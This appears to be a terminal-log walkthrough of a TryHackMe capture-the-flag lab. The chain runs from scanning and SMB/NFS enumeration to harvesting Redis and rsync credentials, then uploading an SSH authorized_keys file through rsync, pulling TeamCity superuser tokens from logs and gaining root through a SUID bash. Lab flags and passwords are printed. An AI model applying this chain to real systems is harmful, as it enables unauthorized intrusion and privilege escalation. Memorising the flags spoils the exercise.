┌──(mikey㉿kali)-[~/rabbit]
└─$ nmap -sC -sV -p 1-1000 10.10.40.193
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-17 20:07 IST

PORT    STATE    SERVICE     VERSION
6/tcp   filtered unknown
22/tcp  open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38138/udp   mountd
|   100005  1,2,3      38319/tcp   mountd
|   100005  1,2,3      38570/udp6  mountd
|   100005  1,2,3      40475/tcp6  mountd
|   100021  1,3,4      37650/udp   nlockmgr
|   100021  1,3,4      38649/tcp   nlockmgr
|   100021  1,3,4      45825/tcp6  nlockmgr
|   100021  1,3,4      60521/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp open     rsync       (protocol version 31)

# sudo smbclient -L 10.10.21.154
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            
                        
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 17:15:10 2021
  ..                                  D        0  Tue Feb  2 14:50:09 2021
  services.txt                        N       38  Sat Feb  6 17:15:09 2021


We get our first flag in services.txt 
┌──(mikey㉿kali)-[~/rabbit]
└─$ cat services.txt
 THM{0a09d51e488f5fa105d8d866a497440a}
        
┌──(mikey㉿kali)-[~/rabbit]
└─$ sudo showmount -e 10.10.21.154
Export list for 10.10.238.66:
/opt/conf *
    
┌──(mikey㉿kali)-[~/rabbit]
└─$ mount -t nfs 10.10.21.154:/opt  /tmp

            
┌──(mikey㉿kali)-[/tmp/opt/conf/redis]
└─$ cat redis.conf | grep -i password
requirepass "B65Hx562F@ggAZ@F"

┌──(mikey㉿kali)-[~/rabbit]
└─$ redis-cli -h 10.10.21.154 -a "B65Hx562F@ggAZ@F" 
10.10.21.154:6379> keys *
1) "internal flag"
2) "marketlist"
3) "tmp"
4) "int"
5) "authlist"
10.10.21.154:6379> get "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"



10.10.21.154:6379> get "authlist"
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.21.154:6379> lrange "authlist" 1 10
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="

┌──(mikey㉿kali)-[~/rabbit]
└─$echo QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg== | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
┌──(mikey㉿kali)-[~/rabbit]
└─$ rsync rsync://rsync-connect@10.10.65.34/files/sys-internal/user.txt /rsync/ 
Password: 

┌──(root㉿kali)-[/rsync]
└─# ls
user.txt
                                                                             
┌──(root㉿kali)-[/rsync]
└─# cat user.txt        
THM{da7c20696831f253e0afaca8b83c07ab}

┌──(mikey㉿kali)-[~/rabbit]
└─$ rsync authorized_keys rsync://rsync-connect@10.10.65.34/files/sys-internal/.ssh/ 
Password: 

┌──(root㉿kali)-[~mikey/internal]
└─# ssh -i rsa sys-internal@10.10.120.193 


sys-internal@vulnnet-internal:/TeamCity/conf$ ss -tulwn
Netid                    State                       Recv-Q                      Send-Q                                                 Local Address:Port                                            Peer Address:Port                     
                                      0.0.0.0:*                        
                                    0.0.0.0:*                        
                                              0.0.0.0:*                        
tcp                      LISTEN                      0                           1                                                 [::ffff:127.0.0.1]:8105                                                       *:*                        
tcp                      LISTEN                      0                           128                                                             [::]:41993                                                   [::]:*                        
tcp                      LISTEN                      0                           128                                                             [::]:55849                                                   [::]:*                        
tcp                      LISTEN                      0                           5                                                               [::]:873                                                     [::]:*                        
tcp                      LISTEN                      0                           128                                                            [::1]:6379                                                    [::]:*                        
tcp                      LISTEN                      0                           64                                                              [::]:41611                                                   [::]:*                        
tcp                      LISTEN                      0                           50                                                              [::]:139                                                     [::]:*                        
tcp                      LISTEN                      0                           100                                               [::ffff:127.0.0.1]:8111             

sys-internal@vulnnet-internal:/TeamCity/logs$ cat catalina.out | grep -i token
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 1844220135994601530 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 1844220135994601530 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 1844220135994601530 (use empty username with the token as the password to access the server)

![](https://i.imgur.com/cNWT1V5.png)

bash-4.4$ ./bash -p
bash-4.4# whoami
root

bash-4.4# cat root.txt
THM{e8996faea46df09dba5676dd271c60bd}
          
                                            
